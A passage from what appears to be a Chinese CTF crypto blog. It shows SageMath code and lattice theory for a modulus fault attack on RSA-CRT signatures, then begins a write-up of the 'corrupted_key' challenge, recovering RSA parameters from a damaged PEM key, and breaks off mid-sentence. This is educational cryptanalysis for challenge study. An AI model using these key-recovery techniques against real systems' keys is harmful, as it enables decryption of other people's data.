class=\"number\">0</span>, <span class=\"number\">6</span>-<span class=\"number\">2</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x, y <span class=\"keyword\">in</span> combinations(result, <span class=\"number\">2</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(-<span class=\"number\">10</span>, <span class=\"number\">10</span>)):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">10</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">            z = a*x+b*y</span><br><span class=\"line\">            <span class=\"keyword\">if</span> z.norm() &gt; sqrt(<span class=\"number\">6</span>*n):</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                vv = vector(v)-z</span><br><span class=\"line\">                <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> vv:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> gcd(i, n) != <span class=\"number\">1</span>:</span><br><span class=\"line\">                        p = gcd(i, n)</span><br><span class=\"line\">                        <span class=\"keyword\">assert</span> n % gcd(i, n) == <span class=\"number\">0</span></span><br><span class=\"line\">                        q = n//p</span><br><span class=\"line\">                        phi = (p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">                        d = inverse_mod(e, phi)</span><br><span class=\"line\">                        m = long_to_bytes(<span class=\"built_in\">int</span>(<span class=\"built_in\">pow</span>(enc, d, n)))</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(m)</span><br><span class=\"line\">                        exit()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>RSA-CRT 签名中计算了：<br>$$<br>\\sigma_p=\\mu(m)^d\\mod \\ p \\\\  \\sigma_q=\\mu(m)^d\\mod \\ q<br>$$<br>然后签名 $\\sigma=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta$ ，其中 $\\alpha=q\\cdot(q^{-1}\\mod\\ p)$ ， $\\beta=p\\cdot(p^{-1}\\mod\\ q)$ 。<br>题目中给出 6 对签名，每对签名用 CRT 不难算出<br>$$<br>v=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta \\mod N\\cdot N’<br>$$<br>其中 $\\sigma_p$ 和 $\\sigma_q$ 和 $N/2$ 一个数量级， $\\alpha$ 和 $\\beta$ 又和 $N$ 一个数量级，故右式远小于 $N\\cdot N’$ ，那么<strong>上式在整数域上是成立的</strong>。<br>一对算不出，但是多对可以，组成向量，有：<br>$$<br>\\boldsymbol{v}=\\alpha\\boldsymbol{x}+\\beta\\boldsymbol{y}<br>$$<br>其中 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 是分量 $n/2$ 位的未知向量， $\\alpha$ 和 $\\beta$ 是有关 $p$ 和 $q$ 的 CRT 系数。<br>不难计算出一组与 $\\mathbb{Z}^\\ell$ 中正交于 $\\boldsymbol{v}$ 的向量的格 $\\boldsymbol{v}^\\bot \\in \\mathbb{Z}^\\ell$ 的约化基 ${\\boldsymbol{b}_1,…,\\boldsymbol{b}_{\\ell-1}}$ 。（可能此时你会疑惑为什么是 ${\\ell-1}$ 个向量，下面的拓展里有解释）<br>特别地，我们有：<br>$$<br>\\alpha \\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle + \\beta \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0 \\quad \\mathrm{for} \\ j=1,2,\\ldots,\\ell-1<br>$$<br><del>（也不是很特别的感觉）</del><br>现在观察方程 $\\alpha\\cdot u+\\beta\\cdot v=0$ ，最小的非零解 $(u,v)\\in \\mathbb{Z}^2$ 是 $\\pm(\\beta,-\\alpha)/g$ ，其中 $g=\\gcd(\\alpha,\\beta)$ 盲猜是非常小的（经测试基本在10以内），意味着 $|u|,|v|\\geq\\mathit{\\Omega}(N)$ 中 $\\mathit{\\Omega}$ 常量是非常小的。（啥玩意？）对 $j=1,2,\\ldots,\\ell-1$ ，有以下两种可能：</p>\n<p><strong>情形1</strong>：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle = \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0$ 。此时 $\\boldsymbol{b}_j$ 属于 $\\mathbb{Z}^\\ell$ 中与 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 正交的向量的格 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$</p>\n<p><strong>情形2</strong>：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle$ 和 $\\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle$ 有绝对值 $\\geq \\mathit{\\Omega}(N)$ ，其中 $\\mathit{\\Omega}(N)$ 是一个小常数。因为 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 的范数都不超过 $\\sqrt{\\ell N}$ ，由柯西-施瓦茨不等式，这意味着 $||\\boldsymbol{b}_j||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$</p>\n<p>因为格 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$ 的秩是 $\\ell-2$ ，当全部 $\\ell-1$ 个向量 $\\boldsymbol{b}_j$ 线性无关时情形1不成立，所以最长的 $\\boldsymbol{b}_{\\ell-1}$ 应该在情形2中，因此 $||\\boldsymbol{b}_{\\ell-1}||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$ 。另一方面，其他向量形成一个秩为 $\\ell-2$ 的格，且体积<br>$$<br>V=\\mathrm{vol}(\\mathbb{Z}\\boldsymbol{b}_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2})\\approx\\frac{\\mathrm{vol}(\\boldsymbol{v}^\\bot)}{||\\boldsymbol{b}_{\\ell-1}||}=\\frac{||\\boldsymbol{v}||}{||\\boldsymbol{b}_{\\ell-1}||}\\leq \\frac{\\sqrt{\\ell}\\cdot N^{3/2}}{\\mathit{\\Omega}(\\sqrt{N/\\ell})}=O(\\ell N)<br>$$<br>盲猜是一个随机的格。特别地，我们有：<br>$$<br>||\\boldsymbol{b}_j||=O(\\sqrt{\\ell-2}\\cdot V^{1/(\\ell-2)})=O(\\ell^{1/2+1/(\\ell-2)}\\cdot N^{1/(\\ell-2)})\\quad\\mathrm{for} \\ j=1,2,\\ldots,\\ell-2<br>$$</p>\n<p>一旦 $\\ell \\geq 5$ ，这个长度就远小于 $\\sqrt{N/\\ell}$ 。假设是这种情况，那么对于 $j=1,2,…,\\ell-2$ ， $\\boldsymbol{b}_j$ 应该是情形1中。这意味着这些向量生成 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$ 中一个满秩的子格 $L’=\\mathbb{Z}\\boldsymbol{b}_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2}$ 。<br>取正交格，我们得到 $(L’)^\\bot \\supset L^\\bot=\\mathbb{Z}\\boldsymbol{x}\\oplus\\mathbb{Z}\\boldsymbol{y} $。因此， $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 属于 $L’$ 的正交格 $(L’)^\\bot$ 。令 ${\\boldsymbol{x’},\\boldsymbol{y’}}$ 为一组该格的约化基，我们可以枚举 $(L’)^\\bot$ 中的长度不超过 $\\sqrt{\\ell N}$ 且为 $\\boldsymbol{x’}$ 和 $\\boldsymbol{y’}$ 线性组合的所有格向量。高斯启发式表明这大约为：<br>$$<br>\\frac{\\pi(\\sqrt{\\ell N})^2}{\\mathrm{vol}((L’)^\\bot)}=\\frac{\\pi\\ell N}{V}=O(1)<br>$$<br>这样的向量，所以这肯定是可行的。对这些向量 $\\boldsymbol{z}$ ，我们计算 $\\gcd(\\boldsymbol{v}-\\boldsymbol{z},N)$ 。我们将因此很快在其中找到 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)$ ，因为 $\\boldsymbol{x}$ 是一个 $(L’)^\\bot$ 中长度 $\\leq\\sqrt{\\ell N}$ 的向量。但根据 $\\boldsymbol{v}$ 的定义，我们有：<br>$$<br>\\boldsymbol{v}=\\boldsymbol{x}\\mod p\\\\<br>\\boldsymbol{v}=\\boldsymbol{y}\\mod q<br>$$<br>故 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)=p$ ，从而分解 $N$ 。</p>\n<h3 id=\"拓展阅读-正交格\"><a href=\"#拓展阅读-正交格\" class=\"headerlink\" title=\"拓展阅读-正交格\"></a>拓展阅读-正交格</h3><p>令 $\\mathbf{b}_1,…,\\mathbf{b}_d$ 为 $\\mathit{\\Lambda}$ （这玩意念Lambda）中的向量。如果这 $d$ 个向量在 $\\mathbf{Z}$ 上线性无关且 $\\mathit{\\Lambda}$ 中的任意元素可以由 $\\mathbf{b}_i$ 整系数线性表出，则这 $d$ 个向量形成 $\\mathit{\\Lambda}$ 中的一组基。 $\\mathit{\\Lambda}$ 中至少存在一组基。 $\\mathit{\\Lambda}$ 的基都有相同的基数，称为 $\\mathit{\\Lambda}$ 的维度。</p>\n<p>如果 $\\mathit{\\Omega}$ 包含 $\\mathit{\\Lambda}$ ，且两者有相同的维度，则称 $\\mathit{\\Lambda}$ 为 $\\mathit{\\Omega}$ 在 $\\mathbf{Z}^n$ 上的一个子格。（子格的定义？） $\\mathit{\\Lambda}$ 的所有基张成相同的 $\\mathbf{Q}^n$ 的 $Q$ 向量子空间（啥玩意？），记为 $E_{\\mathit{\\Lambda}}$ 。 $\\mathbf{Q}^n$ 上 $E_{\\mathit{\\Lambda}}$ 的维度与 $\\mathit{\\Lambda}$ 的维度相同。令格 $\\overline{\\mathit{\\Lambda}}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 。 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 的一个子格。如果 $\\mathit{\\Lambda}=\\overline{\\mathit{\\Lambda}}$ ，那么我们称 $\\mathit{\\Lambda}$ 是一个完备格，特别的， $\\overline{\\mathit{\\Lambda}}$ 是一个完备格。</p>\n<blockquote>\n<p>笔者注记：<br>这里首先将 $\\mathit{\\Lambda}$ 张成一个<strong>有理数空间</strong>，不局限于<strong>整系数</strong>向量组合了，记为 $E_{\\mathit{\\Lambda}}$ 的E我猜是<strong>欧几里得</strong>的意思？然后与 $\\mathbf{Z}^n$ 相交得到的是整数点集合 $\\overline{\\mathit{\\Lambda}}$ ，如此 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 子格的事应该挺自然的。然后如果两者相等，想象一下，都那样张成了都找不到新的点，那这个格确实也挺完备。<br>PS:发现自己念了十年的欧几里得，难怪输入法打不出来（）</p>\n</blockquote>\n<p>令 $(\\mathbf{x},\\mathbf{y})\\rightarrow\\mathbf{x}.\\mathbf{y}$ 为一般意义上的欧里几德内积， $||.||$ 是它对应的范数 <del>（奇怪的表示方法）</del>。令 $F=(E_{\\mathit{\\Lambda}})^-$ 是关于该内积的正交向量子空间。我们定义正交格 $\\mathit{\\Lambda}^-=F\\cap\\mathbf{Z}^n$ 。因此， $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格，其维度为 $n-d$ 。这意味着 $(\\mathit{\\Lambda}^-)^-$ 等于 $\\overline{\\mathit{\\Lambda}}$ 。令 $\\mathcal{B}=(\\mathbf{b}_1,…,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基。</p>\n<blockquote>\n<p>笔者注记：<br>看到这就有点迷糊了，捋一捋： $E_{\\mathit{\\Lambda}}$ 是 $\\mathit{\\Lambda}$ 张成出的有理空间，然后 $F$ 是其正交向量子空间，即<strong>任意从 $\\mathit{\\Lambda}$ 和 $F$ 分别抓两个向量出来，其内积都为 $0$</strong> 。<br>再然后 $\\mathit{\\Lambda}^-$ 是 $F$ 的一个子格，<strong>注意到 $\\mathit{\\Lambda}^-$ 把 $F$ 所有整数点都框进去了</strong>，这就很有意思了，由上面的定义就不难得出正交格 $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格。<br>至于其维度为何是 $n-d$ ，有个概念叫<strong>正交补</strong>，就是正交空间的维数是刚刚好的，对于列空间维数为 $r$ 的矩阵 $A_{r\\times m}$ ，其左零空间的维数是 $m-r$ ，相加恰好为 $m$ 。举例来说，三维中与线正交的是二维空间，与面正交的是一维空间。<br>这篇 paper 习惯用 $E^-$ 表示正交向量子空间，但似乎 $E^\\bot$ 的写法较为广泛。</p>\n</blockquote>\n<p>在 $\\mathbf{Z}^n$ 的正则基上解析每个 $\\mathbf{b}_j$ 如下：</p>\n<p>$$<br>\\mathbf{b}_j =<br>\\begin{pmatrix}<br>b_{1,j} \\\\<br>b_{2,j} \\\\<br>\\vdots \\\\<br>b_{n,j}<br>\\end{pmatrix}<br>$$<br>（这里吐槽一下，由于下划线和 Markdown 语法有冲突，如果不加反斜杠， $b_j$ 写成 $\\mathbf{b}_j$ Latex 就会炸，下文一开始也炸了几回，弄了几次才发现是这问题）</p>\n<p>定义整数 $n\\times d$ 的整数矩阵 $B=(b_{i,j})_{1\\leq i\\leq n,1\\leq j\\leq d}$ ，格 $\\mathit{\\Lambda}$ 由 $B$ 的列向量张成，我们称 $\\mathit{\\Lambda}$ 由 $B$ 张成。令 $Q={^tB}B$ 为 $d\\times d$ 的对称 Gram 矩阵。 $Q$ 的行列式是与 $\\mathcal{B}$ 无关的正整数。 $\\mathit{\\Lambda}$ 的行列式被定义为 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(B)}$ 。</p>\n<blockquote>\n<p>笔者注记：<br>这是的 ${^tB}$ 应该是 $B^T$ 的意思，又是奇怪的写法（）<br>至于 Gram 矩阵，中文音译为格拉姆矩阵，对 $n$ 维欧氏空间上的 $k$ 个向量，其 Gram 矩阵为<br>$$<br>\\triangle(\\mathbf{v}_1,\\dots,\\mathbf{v}_k) =<br>\\begin{pmatrix}<br>\\langle\\mathbf{v}_1,\\mathbf{v}_1\\rangle &amp; \\cdots &amp; \\langle\\mathbf{v}_1,\\mathbf{v}_k\\rangle \\\\<br>\\vdots &amp; \\ddots &amp; \\vdots \\\\<br>\\langle\\mathbf{v}_k,\\mathbf{v}_1\\rangle &amp; \\cdots &amp; \\langle\\mathbf{v}_k,\\mathbf{v}_k\\rangle<br>\\end{pmatrix}<br>$$<br>不难看出这个可以等价表示为 $V^T\\times V$ ，得出的矩阵也显然是对称的。<br>这里 $\\mathit{\\Lambda}$ 不是一个方阵，故不能直接求出其行列式，那么就应该通过其 Gram 矩阵来求行列式，这里我觉得应该是 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(Q)}$ ，但我不确定。</p>\n</blockquote>\n<p><strong>定理1</strong> 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的完备格，那么 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。<br>证明：我们有 $\\mathit{\\Lambda}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 和 $\\mathit{\\Lambda}^-=E_{\\mathit{\\Lambda}}^-\\cap\\mathbf{Z}^n$ 。从另一篇论文（我也没读过）我们知道：<br>$$<br>\\det(\\mathbf{Z}^n)=\\frac{\\det(E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n)}{\\det((E_{\\mathit{\\Lambda}}^-)\\cap(\\mathbf{Z}^n)^*)}<br>$$<br>其中 $(\\mathbf{Z}^n)^*$ 表示 $\\mathbf{Z}^n$ 上的极格。但 $\\det(\\mathbf{Z}^n)=1$ （？为什么要说但呢？）且 $(\\mathbf{Z}^n)^*=\\mathbf{Z}^n$ ，故 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。</p>\n<p><strong>推论2</strong> 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的格，那么 $\\det((\\mathit{\\Lambda}^-)^-)=\\det(\\mathit{\\Lambda}^-)=\\det(\\overline{\\mathit{\\Lambda}})$ 。</p>\n<p><strong>定理3</strong> 令 $(\\mathbf{b}_1,…,\\mathbf{b}_d)$为格$\\mathit{\\Lambda}$ 在 $\\mathbf{Z}^n$ 上的一组 LLL 约化基，那么：</p>\n<ol>\n<li>$\\det(\\mathit{\\Lambda})\\leq \\prod^d_{i=1}||\\mathbf{b}_i||\\leq 2^{d(d-1)/4}\\det(\\mathit{\\Lambda})$</li>\n<li>对任意线性无关的向量 $\\mathbf{x}_1,…,\\mathbf{x}_t\\in\\mathit{\\Lambda}$ ，当 $1\\leq j \\leq t$ 时，有：</li>\n</ol>\n<p>$$<br>||\\mathbf{b}_j||\\leq 2^{(d-1)/2}\\max(||\\mathbf{x}_1||,…,||\\mathbf{x}_t||)<br>$$</p>\n<p>我们现在描述计算正交格的一组 LLL 约化基的基本方法。令 $\\mathcal{B}=(\\mathbf{b}_1,…,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基， $B=(b_{i,j})$ 为其对应的 $n\\times d$ 的矩阵。令 $c$ 为一个正整数常量。定义 $\\mathit{\\Omega}$为$\\mathbf{Z}^{n+d}$ 上由以下 $(n+d)\\times n$ 矩阵张成的格。</p>\n<p>$$<br>B^-=<br>\\begin{pmatrix}<br>c\\times b_{1,1} &amp; c\\times b_{2,1} &amp; \\cdots &amp; c\\times b_{n,1} \\\\<br>c\\times b_{1,2} &amp; c\\times b_{2,2} &amp; \\cdots &amp; c\\times b_{n,2} \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>c\\times b_{1,d} &amp; c\\times b_{2,d} &amp; \\cdots &amp; c\\times b_{n,d} \\\\<br>1 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br>0 &amp; 1 &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 1<br>\\end{pmatrix}<br>$$<br>矩阵 $B^-$ 被分成两块：上面 $d\\times n$ 部分是 $c\\ {^tB}$ ，下面 $n\\times n$ 部分是单位阵。<br>设 $p_{\\uparrow}$ 和 $p_{\\downarrow}$ 是两个投影，将 $\\mathbf{Z}^{n+d}$ 的任何向量分别映射到由其前 $d$ 个坐标构成的 $\\mathbf{Z}^d$ 向量和由其最后 $n$ 个坐标构成的 $\\mathbf{Z}^n$ 向量，所有投影都与正则基有关。<del>（这段翻译累死我了）</del><br>令 $\\mathbf{x}$ 为 $\\mathit{\\Omega}$ 的一个向量并记 $\\mathbf{y}=p_{\\downarrow}(\\mathbf{x})$ ，那么</p>\n<p>$$<br>p_{\\uparrow}(\\mathbf{y})=<br>\\begin{pmatrix}<br>\\mathbf{y}.\\mathbf{b}_1 \\\\<br>\\vdots \\\\<br>\\mathbf{y}.\\mathbf{b}_d<br>\\end{pmatrix}<br>$$<br>因此，当且仅当 $p_{\\uparrow}(\\mathbf{x})=0$ 时有 $\\mathbf{y}\\in \\mathit{\\Lambda}^-$ 。此外，如果 $||\\mathbf{x}||\\leq c$ ，那么 $p_{\\uparrow}(\\mathbf{x})=0$ 。</p>\n<p><strong>定理4</strong> 令 $(\\mathbf{x}_1,\\mathbf{x}_2,…,\\mathbf{x}_n)$ 为格 $\\mathit{\\Omega}$ 的一组 LLL 约化基。若</p>\n<p>$$<br>c&gt;2^{(n-1)/2+(n-d)(n-d-1)/4}\\det(\\overline{\\mathit{\\Lambda}})<br>$$<br>则 $(p_{\\downarrow}(\\mathbf{x}_1),p_{\\downarrow}(\\mathbf{x}_2),…,p_{\\downarrow}(\\mathbf{x}_{n-d}))$ 为 $\\overline{\\mathit{\\Lambda}}$ 的一组 LLL 约化基。</p>\n<p>使用阿达马不等式，我们得到以下算法：</p>\n<p><strong>算法5</strong> 给定一组 $\\mathbf{Z}^n$ 上格 $\\mathit{\\Lambda}$ 的基 $(\\mathbf{b}_1,\\mathbf{b}_2,…,\\mathbf{b}_d)$ ，该算法计算一组 $\\overline{\\mathit{\\Lambda}}$ 的LLL约化基。</p>\n<ol>\n<li><p>选取 $c=\\lceil2^{(n-1)/2+(n-d)(n-d-1)/4}\\prod^d_{j=1}||\\mathbf{b}_j||\\rceil$</p>\n</li>\n<li><p>计算 $(n+d)\\times n$ 的整数矩阵 $B^-$ 和 $\\mathbf{b}_1,…,\\mathbf{b}_d$ 对应的 $n\\times d$ 矩阵 $B=(b_{i,j})$</p>\n</li>\n<li><p>计算由 $B^-$ 张成的格的一组 LLL 约化基 $(\\mathbf{x}_1,\\mathbf{x}_2,…,\\mathbf{x}_n)$</p>\n</li>\n<li><p>输出 $(p_{\\downarrow}(\\mathbf{x}_1),p_{\\downarrow}(\\mathbf{x}_2),…,p_{\\downarrow}(\\mathbf{x}_{n-d}))$</p>\n</li>\n</ol>\n<p>可以证明，这是一个关于空间维数 $n$ 、格维数 $d$ 和 $||\\mathbf{b}_j||$ 比特长度的任何上界的确定性多项式时间算法。在实践中，不需要选择这样大的常数 $c$ ，因为 LLL 算法的理论界非常悲观。（翻译了这么久都看不懂，我也很悲观.jpg）</p>\n<blockquote>\n<p>笔者注记：<br>$\\lceil$和$\\rceil$表示向上取整，例如$\\lceil 1.2 \\rceil = 2$。</p>\n</blockquote>\n<h4 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h4><p>之前看过 Herry 师傅从 dbt 那抄的一个求法是用左零空间求解，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">orthogonal_lattice</span>(<span class=\"params\">B</span>):</span><br><span class=\"line\">    LB = B.transpose().left_kernel(basis=<span class=\"string\">&quot;LLL&quot;</span>).basis_matrix()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LB</span><br></pre></td></tr></table></figure>\n\n<p>但笔者发现这样似乎只能在低维下求解，高维情况下时间会爆炸（至少试过一夜都没跑出来）<br>于是照着 paper 搓了一个 implemention ，快了很多，三分钟左右就能求解 $255\\times512$ 矩阵的正交格，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">orthogonal_lattice</span>(<span class=\"params\">B</span>):</span><br><span class=\"line\">    _d, _n = B.nrows(), B.ncols()</span><br><span class=\"line\">    _c = <span class=\"number\">2</span> ** <span class=\"built_in\">min</span>(((_n-<span class=\"number\">1</span>)/<span class=\"number\">2</span>+(_n-_d)*(_n-_d-<span class=\"number\">1</span>)/<span class=\"number\">4</span>),<span class=\"number\">20</span>)    <span class=\"comment\"># this bound can be adjusted as needed</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> B:</span><br><span class=\"line\">        _c *= b.norm()</span><br><span class=\"line\">    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))</span><br><span class=\"line\">    B_r = B_bot.transpose().LLL()</span><br><span class=\"line\">    LB = B_r.matrix_from_rows_and_columns(<span class=\"built_in\">range</span>(_n-_d), <span class=\"built_in\">range</span>(_d,_n+_d))</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (B*LB.transpose()).is_zero()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LB</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><p><a href=\"https://link.springer.com/chapter/10.1007/BFb0052236\">P. Q. Nguyen and J. Stern. Merkle-Hellman revisited: A cryptoanalysis of the Qu-Vanstone cryptosystem based on group factorizations. In B. S. Kaliski Jr., editor, CRYPTO, volume 1294 of Lecture Notes in Computer Science, pages 198–212. Springer, 1997.</a></p>\n</li>\n<li><p><a href=\"https://link.springer.com/article/10.1007/s13389-011-0015-x\">Modulus Fault Attacks Against RSA-CRT Signatures</a></p>\n</li>\n<li><p><a href=\"https://zhuanlan.zhihu.com/p/50483906\">知乎 线性代数之——正交向量与子空间</a></p>\n</li>\n<li><p><a href=\"https://zhuanlan.zhihu.com/p/187345192\">知乎 格拉姆矩阵（Gram matrix）详细解读</a></p>\n</li>\n</ul>"},{"title":"2022 蓝帽杯 - corrupted_key","date":"2022-07-16T05:08:00.000Z","_content":"\n很有意思的一道题，涉及私钥文件的结构。\n<!--more-->\n********************************\n\n## 题目\n\n给了一个 `priv.pem`\n\n```plain\n-----BEGIN RSA PRIVATE KEY-----\nMIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH\nUFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm\ndJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB\n\n\n\n\n\n\n\n\nyQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c\nzUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==\n-----END RSA PRIVATE KEY-----\n```\n\n和一个加密的脚本\n\n```python\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom secret import flag\n\nkey = RSA.generate(1024)\nopen(\"flag.enc\",'wb').write(PKCS1_OAEP.new(key.publickey()).encrypt(flag))\nopen('priv.pem','wb').write(key.exportKey('PEM'))\n```\n\n然后就是 `flag.enc`\n\n## 分析\n\n### 数理部分\n\n题目名为 **corrupted_key** ，意为残损的私钥文件，既然是残损的，那么剩下的部分就是解题的关键了。\n通过查看 `Crypto.PublicKey.RSA` 的源码，发现私钥文件的结构是：\n\n```plain\n0 （注意！！！！）\nn\ne\np\nq\nd mod (p-1)\nd mod (q-1)\n(inverse of q) mod p\n```\n\n完整来说是\n\n```plain\nRSAPrivateKey ::= SEQUENCE {\nversion Version,\nmodulus INTEGER, -- n\npublicExponent INTEGER, -- e\nprivateExponent INTEGER, -- d\nprime1 INTEGER, -- p\nprime2 INTEGER, -- q\nexponent1 INTEGER, -- d mod (p-1)\nexponent2 INTEGER, -- d mod (q-1)\ncoefficient INTEGER, -- (inverse of q) mod p\notherPrimeInfos OtherPrimeInfos OPTIONAL\n}\n```\n\n一通操作后发现可以拿到 $n$,$e$,CRT 系数（即 $q^{-1}\\mod p$ ）和 $d_q$ 低位，至于怎么拿到的等下再说，这里可以构造等式如下：\n$$\n    t = q^{-1} \\pmod p \\\\\\\\\n    tq-1 = 0 \\pmod p \\\\\\\\\n    tq^2 - q = 0 \\pmod n\n$$\n然后\n$$\n    ed_q = 1 \\pmod{q-1} \\\\\\\\\n    ed_q - 1 = k(q - 1) \\\\\\\\\n    f = (dq_h + dq_l)e - 1 + k = kq\n$$\n代入得\n$$\n    tf^2 - kf = 0 \\pmod n\n$$\n显然 $k$ 和 $e$ 数量级是相当的， $dq_h$ 的未知高位有512-120=392位，就可以通过 coppersmith 爆破 $k$ 。\n\n### 参数提取\n\n然后就是有意思的部分了，如何从残损的私钥文件中提取参数呢？\n对着源码一顿调试了几个钟（太菜了呜呜），发现是先将各个参数塞进一个首位为 0 的数组，然后各个参数前面补上长度，后面 `long_to_bytes` 转换成 bytes ，最后拼接起来。\n我的提取脚本如下：\n\n```python\nfrom binascii import a2b_base64\nfrom Crypto.Util.asn1 import DerInteger\nfrom Crypto.Util.number import *\npem = '''-----BEGIN RSA PRIVATE KEY-----\nMIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH\nUFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm\ndJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB\n\nyQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c\nzUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==\n-----END RSA PRIVATE KEY-----'''\n\npemlist = pem.split('\\n')\ndecode_b64 = b''\nfor i in pemlist[1:-1]:\n    decode_b64+=a2b_base64(i)\ndecode_b64 = decode_b64[4:] # 丢弃前4个字节\n\nder_int = DerInteger()\n\n# 提取n\nn = decode_b64[3:135]\nder_int.decode(n)\nprint('[+] n =',n:=der_int.value)\n\n# 提取e\ne = decode_b64[135:140]\nder_int.decode(e)\nprint('[+] e =',e:=der_int.value)\n\n# 提取CRT系数\nfor len in range(1,300):\n    try:\n        q_inv_p = decode_b64[-len:]\n        der_int.decode(q_inv_p)\n        print('[+] q_inv_p =',q_inv_p:=der_int.value)\n    except:\n        len+=1\n    else:\n        # print(len)    # 67\n        break\n# print(q_inv_p.bit_length())   # 512\n\n# 提取dp低位\ndp_l = decode_b64[-82:-67]\n# print(dp_l)\nprint('[+] dp_l =',bytes_to_long(dp_l))\n```\n\n可以看到我一开始直接把前 4 个字节丢了，然后在新 List 里用库函数解析 3 - 134 号位的数据，这部分就是属于 $n$ 的，然而实际上 `bytes_to_long` 解析 7 